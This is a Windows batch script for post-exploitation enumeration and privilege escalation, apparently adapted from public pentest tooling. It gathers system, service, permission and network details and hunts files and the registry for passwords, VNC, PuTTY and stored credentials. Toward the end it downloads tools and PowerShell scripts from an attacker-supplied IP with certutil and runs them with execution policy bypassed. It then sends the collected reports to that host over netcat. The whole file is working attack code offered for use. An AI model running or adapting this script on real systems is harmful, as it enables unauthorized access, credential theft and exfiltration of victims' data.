@echo off
title Windows Enumeration and Privilege Escalation Script
echo.
echo Loading System Information, wait a few seconds...
systeminfo > systeminfo.txt 2> nul
find "KB" systeminfo.txt > hotfix.txt 2> nul
cls
:MENU
echo Windows Enumeration and Privilege Escalation Script
echo www.joshruppe.com ^| Twitter: @josh_ruppe ^| https://github.com/joshruppe/winprivesc/blob/master/winprivesc.bat
echo https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html ^| xapax.gitbooks
echo https://addaxsoft.com/wpecs/ ^| the Open Source Windows Previlege Escalation Cheat Sheet
echo https://hackmag.com/security/elevating-privileges-to-administrative-and-further/ ^| TOP–10 ways to boost your privileges in Windows systems
echo https://decoder.cloud/2017/02/21/the-system-challenge/ ^| decoders blog
echo https://decoder.cloud/2017/02/21/the-system-challenge/
echo https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ ^| absolomb
echo http://www.fuzzysecurity.com/tutorials/16.html ^| fuzzysecurity
echo https://guif.re/windowseop 
echo https://pentestlab.blog/
echo https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html
echo https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
echo https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/chapter-4.md

echo.

rem must entered my ip as first cmd variable, port 80 must be on my computer with nc.exe, accesschk.exe, jaws-enum.ps1
rem nc -l -p 1234 > report.txt on our computer , nc -l -p 5555 > jaws.txt on our computer, nc -l -p 6666 > reportps.txt


echo 1 - All to Report

SET /P C=Select^>
echo.
IF %C%==1 GOTO ALL

:ALL
echo WinPrivEsc > report.txt
echo Windows Enumeration and Privilege Escalation Script>> report.txt
echo www.joshruppe.com ^| Twitter: @josh_ruppe>> report.txt
echo.>> report.txt
echo Report generated: >> report.txt
echo. >> report.txt
for /F "tokens=* USEBACKQ" %%F IN ('Date') do (
set Date=%%F
echo %Date% >> report.txt
)


echo __________________________ >> report.txt
echo. >> report.txt
echo      OPERATING SYSTEM >> report.txt
echo __________________________>> report.txt
echo.>> report.txt
type systeminfo.txt >> report.txt
echo.>> report.txt
echo [++OS Name]>> report.txt
echo.>> report.txt
for /F "tokens=3-7" %%a IN ('find /i "OS Name:" systeminfo.txt') do set Name=%%a %%b %%c %%d %%e>> report.txt
echo %Name%>> report.txt
echo.>> report.txt
echo [++OS Version]>> report.txt
echo.>> report.txt
for /F "tokens=3-6" %%a IN ('findstr /B /C:"OS Version:" systeminfo.txt') do set Version=%%a %%b %%c %%d>> report.txt
echo %Version%>> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++System Architecture]>> report.txt
echo.>> report.txt
for /F "tokens=3-4"  %%a IN ('findstr /B /C:"System Type:" systeminfo.txt') do set Type=%%a %%b>> report.txt
echo %Type%>> report.txt
echo.>> report.txt
echo [++System Boot Time]>> report.txt
echo.>> report.txt
for /F "tokens=4-6" %%a IN ('findstr /B /C:"System Boot Time:" systeminfo.txt') do set UpTime=%%a %%b %%c>> report.txt
echo %UpTime%>> report.txt
echo.>> report.txt
echo [++Page File Location(s)]>> report.txt
echo.>> report.txt
for /F "tokens=4" %%a IN ('findstr /B /C:"Page File Location(s):" systeminfo.txt') do set Page=%%a>> report.txt
echo %Page%>> report.txt
echo.>> report.txt
echo [++Hotfix(s) Installed]>> report.txt
echo.>> report.txt
setlocal enabledelayedexpansion
for /F "tokens=2" %%a IN ('findstr /v ".TXT" hotfix.txt') do (
  set Hot=%%~a
  echo !Hot!>> report.txt
)
echo.>> report.txt
echo [++Hosts File]>> report.txt
echo.>> report.txt
more c:\WINDOWS\System32\drivers\etc\hosts>> report.txt
echo.>> report.txt
echo [++Networks File]>> report.txt
echo.>> report.txt
more c:\WINDOWS\System32\drivers\etc\networks>> report.txt
echo.>> report.txt
echo [++Running Services]>> report.txt
echo.>> report.txt
net start>> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++Services]>> report.txt
echo.>> report.txt
sc query state=all>> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++Services of system]>> report.txt
tasklist /v /fi "username eq system"  >>report.txt
echo.>> report.txt
echo.>> report.txt
echo [++Updates]>> report.txt
echo.>> report.txt
wmic qfe >> report.txt
echo.>> report.txt
echo [++powershell]>> report.txt
echo.>> report.txt
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion >> report.txt
echo.>> report.txt
echo.>> report.txt
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services" >>report.txt
echo.>> report.txt
echo [++services wmic]>> report.txt
echo.>> report.txt
wmic service list brief >>report.txt
echo.>> report.txt
echo [++scheduled tasks]>> report.txt
echo.>> report.txt
schtasks /query /fo LIST 2>nul >>report.txt
echo.>> report.txt
echo.>> report.txt
wmic startup get caption,command>>report.txt
echo.>> report.txt
echo [++scheduled tasks in registry]>> report.txt
echo.>> report.txt
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R>>report.txt
echo.>> report.txt
echo.>> report.txt
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run>>report.txt
echo.>> report.txt
echo.>> report.txt
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce>>report.txt
echo.>> report.txt
echo.>> report.txt
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup">>report.txt
echo.>> report.txt
echo.>> report.txt
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup">>report.txt
echo.>> report.txt
echo.>> report.txt
echo [++bad permissions services] >> report.txt
echo.>> report.txt
for /f "tokens=2 delims='='" %%a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %%a >> permissions.txt
echo.>> report.txt
echo hi!!!
for /f eol^=^"^ delims^=^" %%a in (permissions.txt) do cmd.exe /c icacls "%%a" >> report.txt
echo.>> report.txt
echo.>> report.txt
for /f eol^=^"^ delims^=^" %%a in (permissions.txt) do cmd.exe /c cacls "%%a" >> report.txt
echo.>> report.txt
echo [++icacls in files- full in everyone]>> report.txt
echo.>> report.txt
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone">> report.txt
echo.>> report.txt
echo.>> report.txt
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone">> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++full control users]>> report.txt
echo.>> report.txt
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users">> report.txt
echo.>> report.txt
echo.>> report.txt
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" >> report.txt

echo.>> report.txt
echo.>> report.txt
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone">> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++modify folders everyone]>> report.txt
echo.>> report.txt
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone">> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++modify folders users]>> report.txt
echo.>> report.txt
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> report.txt
echo.>> report.txt
echo.>> report.txt
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" >> report.txt
echo.>> report.txt
echo.>> report.txt
echo The most pleasant thing is to see SERVICE_ALL_ACCESS permission for the authenticate and power users. However, there could be another good variants: >> report.txt

echo SERVICE_CHANGE_CONFIG — can change service run file; >> report.txt
echo WRITE_DAC — allows to change permissions which might lead to SERVICE_CHANGE_CONFIG;>> report.txt
echo WRITE_OWNER — you can become an owner by means of it;>> report.txt
echo GENERIC_WRITE — inherits SERVICE_CHANGE_CONFIG permissions;>> report.txt
echo GENERIC_ALL — inherits SERVICE_CHANGE_CONFIG permissions.>> report.txt
echo.>> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++services on computer]>> report.txt
echo.>> report.txt
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F "tokens=2 delims= " %%i in (Servicenames.txt) DO sc qc %%i >> report.txt
echo.>> report.txt
echo.>> report.txt
echo.>> report.txt
echo You are looking for BUILTIN\Users:(F)(Full access), BUILTIN\Users:(M)(Modify access) or BUILTIN\Users:(W)(Write-only access) in the output. >>report.txt
echo.>> report.txt
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """>>report.txt
echo.>> report.txt
echo.>> report.txt
wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """ >>report.txt
echo.>> report.txt
echo.>> report.txt
echo echo [++useful for brute force]>> report.txt
echo.>> report.txt
echo.>> report.txt
net accounts >> report.txt
echo.>> report.txt
echo.>> report.txt
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ >>report.txt
echo.>> report.txt

echo.>> report.txt
echo try to cacls the executable of its service! >>report.txt
echo.>> report.txt
echo.>> report.txt
echo _________________>> report.txt
echo.>> report.txt
echo      STORAGE >> report.txt
echo _________________>> report.txt
echo.>> report.txt
echo [++Physical Drives]>> report.txt
net share>> report.txt
echo.>> report.txt
echo [++Network Drives]>> report.txt
echo.>> report.txt
net use>> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++Exported Folders]>> report.txt
echo.>> report.txt
net share>> report.txt
echo.>> report.txt
echo.>> report.txt
echo ____________________>> report.txt
echo.>> report.txt
echo      NETWORKING >> report.txt
echo ____________________>> report.txt
echo.>> report.txt
echo [++IPCONFIG]>> report.txt
ipconfig /allcompartments /all>> report.txt
echo.>> report.txt
echo [++MAC Addresses]>> report.txt
getmac>> report.txt
echo.>> report.txt
echo [++Route]>> report.txt
echo.>> report.txt
route PRINT>> report.txt
echo.>> report.txt
echo [++Netstat]>> report.txt
netstat -ano>> report.txt
echo.>> report.txt
echo [++ARP]>> report.txt
arp -a>> report.txt
echo.>> report.txt
echo [++Firewall Configuration]>> report.txt
echo.>> report.txt
netsh firewall show config>> report.txt
echo.>> report.txt
echo [++Firewall dump]>> report.txt
echo.>> report.txt
netsh advfirewall firewall dump >>report.txt
echo.>> report.txt
echo.>> report.txt
echo [++Firewall state]>> report.txt
echo.>> report.txt
netsh firewall show state >>report.txt
echo.>> report.txt
echo.>> report.txt
echo [++Domain]>> report.txt
echo.>> report.txt
set userdomain>> report.txt
echo.>> report.txt
echo.>> report.txt
echo ___________________>> report.txt
echo.>> report.txt
echo      PROCESSES >> report.txt
echo ___________________>> report.txt
echo.>> report.txt
echo [++Tasklist]>> report.txt
tasklist /v>> report.txt
echo.>> report.txt
echo [++Drivers Installed]>> report.txt
driverquery /v>> report.txt
echo.>> report.txt
wmic logicaldisk get caption || fsutil fsinfo drives >> report.txt
echo.>> report.txt
echo.>> report.txt
wmic logicaldisk get caption,description,providername >> report.txt
echo.>> report.txt

echo.>> report.txt
echo.>> report.txt
echo ___________________>> report.txt
echo.>> report.txt
echo      Environment Variables >> report.txt
echo ___________________>> report.txt
echo.>> report.txt
echo [++Env Vars]>> report.txt
echo.>> report.txt
set>> report.txt
echo.>> report.txt
echo.>> report.txt

echo.>> report.txt
echo ____________________>> report.txt
echo.>> report.txt
echo      SNMP >> report.txt
echo ____________________>> report.txt
echo.>> report.txt
echo [++SNMP]>> report.txt
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s>> report.txt
echo.>> report.txt


echo ___________________>> report.txt
echo.>> report.txt
echo      USER INFO >> report.txt
echo ___________________>> report.txt
echo.>> report.txt
echo [++Current User]>> report.txt
echo.>> report.txt
whoami>> report.txt
echo.>> report.txt
echo.>> report.txt
net user %USERNAME%>> report.txt
echo.>> report.txt
echo.>> report.txt
whoami /priv>> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++All Users]>> report.txt
echo.>> report.txt
net users>> report.txt
echo.>> report.txt
echo [++Administrators members]>> report.txt
echo.>> report.txt
echo.>> report.txt
net localgroup administrators>> report.txt
echo.>> report.txt
echo [++User Groups- all groups exist in computer]>> report.txt
net localgroup>> report.txt
echo.>> report.txt
echo ___________________>> report.txt
echo.>> report.txt
echo      IMPORTAN FILES >> report.txt
echo ___________________>> report.txt
echo.>> report.txt
if exist "%SYSTEMROOT%\repair" echo repair exists!!!! >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist "%SYSTEMROOT%\System32\config" echo config exists!!!! >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist "C:\unattend.xml" echo unattend exists in c >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\Windows\Panther\Unattend.xml  echo unattend exists in panter >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\Windows\Panther\Unattend\Unattend.xml  echo unattend exists in unattend >> report.txt

echo.>> report.txt
echo.>> report.txt
if exist C:\Windows\system32\sysprep.inf  echo  sysprep exists in system32>> report.txt

echo.>> report.txt
echo.>> report.txt
if exist C:\Windows\system32\sysprep\sysprep.xml  echo unattend exists in sysprep >> report.txt
echo.>> report.txt
echo.>> report.txt
echo.>> report.txt
echo it may have passwords in base64 >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist %SYSTEMDRIVE%\pagefile.sys echo pagefile exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\debug\NetSetup.log echo  NetSetup.log exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\repair\sam echo  sam file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\repair\system echo  system file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\repair\software echo  software file exists >> report.txt

echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\repair\security echo  security file exists >> report.txt

echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\iis6.log echo  iis log exists >> report.txt

echo.>> report.txt
echo.>> report.txt 
if exist %WINDIR%\system32\config\AppEvent.Evt echo  AppEvent file exists >> report.txt

echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\system32\config\SecEvent.Evt  echo  SecEvent file exists >> report.txt

echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\system32\config\default.sav  echo  default.sav file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\system32\config\security.sav  echo  security.sav file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\system32\config\software.sav  echo  software.sav file exists >> report.txt
echo.>> report.txt
if exist %WINDIR%\system32\config\system.sav  echo  system.sav file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\system32\CCM\logs\*.log  echo  ccm logs exists >> report.txt

echo.>> report.txt
echo.>> report.txt 
if exist %USERPROFILE%\ntuser.dat  echo  ntuser.dat file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist %WINDIR%\System32\drivers\etc\hosts  echo  etc hosts file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\Windows\win.ini  echo  win exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\apache\conf\extra\httpd-xampp.conf echo  httpd xampp file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\apache\conf\httpd.conf echo  httpd conf file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\apache\logs\access.log echo  access log file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\apache\logs\error.log echo  error log exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist "C:\xampp\FileZillaFTP\FileZilla Server.xml" echo  filezilla exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\MercuryMail\MERCURY.INI echo mercury exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\mysql\bin\my.ini echo  mysql exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\php\php.ini echo php exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\security\webdav.htpasswd echo  webdav exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\sendmail\sendmail.ini echo  sendmail file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
if exist C:\xampp\tomcat\conf\server.xml echo  tomcat file exists >> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++vnc files]>> report.txt
echo.>> report.txt
echo.>> report.txt
dir c:*vnc.ini /s /b >> report.txt
echo.>> report.txt

echo.>> report.txt
dir c:*ultravnc.ini /s /b >> report.txt

echo.>> report.txt
echo.>> report.txt
dir /a "C:\Program Files" >> report.txt
echo.>> report.txt
echo.>> report.txt
dir /a "C:\Program Files (x86)">> report.txt
echo.>> report.txt
echo.>> report.txt
echo [++software registry]>> report.txt
echo.>> report.txt
reg query HKEY_LOCAL_MACHINE\SOFTWARE>> report.txt
echo.>> report.txt
echo.>> report.txt

echo [++web places]>> report.txt
echo.>> report.txt
dir c:\*web.config /s /p>> report.txt

echo.>> report.txt
echo.>> report.txt
dir /s c:\*php.ini >> report.txt
echo.>> report.txt
echo.>> report.txt
dir /s c:\*httpd.conf >> report.txt
echo.>> report.txt
echo.>> report.txt
dir /s c:\*httpd-xampp.conf >> report.txt
echo.>> report.txt
echo.>> report.txt
dir /s c:\*my.ini >> report.txt
echo.>> report.txt
echo.>> report.txt
dir /s c:\*my.cnf>> report.txt
echo.>> report.txt
echo.>> report.txt
dir /s c:\*access.log >> report.txt
echo.>> report.txt
echo.>> report.txt
dir /s c:\*error.log >> report.txt
echo.>> report.txt
echo.>> report.txt 
echo ___________________>> report.txt
echo.>> report.txt
echo      PASSWORD FILES >> report.txt
echo ___________________>> report.txt
echo.>> report.txt
findstr /SI /M "password" c:\*.xml 2>nul >>report.txt
echo.>> report.txt
echo.>> report.txt
findstr /SI /M "password" c:\*.ini 2>nul >>report.txt
echo.>> report.txt
echo.>> report.txt
findstr /SI /M "password" c:\*.txt 2>nul >>report.txt
echo.>> report.txt
echo.>> report.txt
findstr /spin "password" c:\*.* >> report.txt 
echo.>> report.txt
echo.>> report.txt
dir /S /B c:\*pass*.txt == c:\*pass*.xml == c:\*pass*.ini == c:\*cred* == c:\*vnc* == c:\*.config* 2> nul >> report.txt ///////////////////////////////////////
echo.>> report.txt
echo.>> report.txt
REG QUERY HKLM /F "password" /t REG_SZ /S /K >> report.txt
echo.>> report.txt
echo.>> report.txt
REG QUERY HKCU /F "password" /t REG_SZ /S /K >> report.txt
echo.>> report.txt
echo.>> report.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> report.txt
echo.>> report.txt
echo.>> report.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" >> report.txt
echo.>> report.txt
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> report.txt
echo.>> report.txt
echo.>> report.txt
reg query "HKCU\Software\%USERNAME%\PuTTY\Sessions" >> report.txt
echo.>> report.txt
echo.>> report.txt
reg query "HKCU\Software\ORL\WinVNC3\Password" >> report.txt
echo.>> report.txt
echo.>> report.txt
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> report.txt

echo.>> report.txt
echo.>> report.txt
reg query HKLM /f password /t REG_SZ /s >> report.txt
echo.>> report.txt
echo.>> report.txt
reg query HKCU /f password /t REG_SZ /s >> report.txt
echo.>> report.txt
echo.>> report.txt
REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList >> report.txt
echo.>> report.txt
echo.>> report.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> report.txt
echo.>> report.txt
echo.>> report.txt 
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated >> report.txt

echo.>> report.txt
echo.>> report.txt
cmdkey /list
echo.>> report.txt
echo.>> report.txt
dir C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials\ >> report.txt
echo.>> report.txt
echo.>> report.txt
dir C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Credentials\ >> report.txt
echo.>> report.txt
echo.>> report.txt
echo __________________________>> report.txt
echo.>> report.txt
echo      ACCESS CHECK >> report.txt
echo __________________________ >> report.txt
echo. >> report.txt
certutil.exe -urlcache -split -f http://%1/accesschk.exe accesschk.exe
accesschk.exe /accepteula
accesschk.exe -uwcqv "Authenticated Users" * >> report.txt
echo.>> report.txt
echo. >> report.txt
accesschk.exe -uwdqs Users c:\ >> report.txt
echo.>> report.txt
echo. >> report.txt
accesschk.exe -uwdqs "Authenticated Users" c:\ >> report.txt
echo.>> report.txt
echo. >> report.txt
accesschk.exe -uwqs Users c:\*.* >> report.txt
echo.>> report.txt
echo. >> report.txt
accesschk.exe -uwqs "Authenticated Users" c:\*.* >> report.txt
echo.>> report.txt
echo. >> report.txt
FOR /F "tokens=2 delims= " %%i in (Servicenames.txt) DO sc qc %%i | accesschk.exe -ucqv >> report.txt

echo. >> report.txt
echo __________________________>> report.txt
echo.>> report.txt
echo      jaws >> report.txt
echo __________________________ >> report.txt
echo. >> report.txt
certutil.exe -urlcache -split -f http://%1/jaws-enum.ps1 jaws-enum.ps1
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

echo. >> report.txt
echo __________________________>> report.txt
echo.>> report.txt
echo      sending report >> report.txt
echo __________________________ >> report.txt
echo. >> report.txt
certutil.exe -urlcache -split -f http://%1/nc.exe nc.exe



nc.exe -w 3 %1 1234 < report.txt
nc.exe -w 3 %1 5555 < JAWS-Enum.txt

echo __________________________ >> report.txt
echo. >> report.txt
echo      ran ps-pe script >> report.txt
echo __________________________>> report.txt
echo.>> report.txt

certutil.exe -urlcache -split -f http://%1/ps-pe.ps1 ps-pe.ps1
powershell.exe -ExecutionPolicy Bypass -File .\ps-pe.ps1

nc.exe -w 3 %1 6666 < reportps.txt


echo Done, check report.txt
echo.
del systeminfo.txt
del Servicenames.txt
del hotfix.txt
EXIT /B



:EXIT
del systeminfo.txt
del hotfix.txt
EXIT /B
